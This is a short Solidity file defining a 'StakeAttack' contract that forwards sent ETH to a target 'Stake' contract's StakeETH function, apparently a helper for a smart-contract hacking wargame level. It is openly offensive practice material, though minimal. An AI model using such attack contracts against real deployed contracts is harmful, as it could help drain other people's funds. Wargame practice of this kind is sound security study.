// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../levels/Stake.sol';

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
contract StakeAttack {

  function attack(Stake _target) public payable {
    _target.StakeETH{value: msg.value}();
  }
}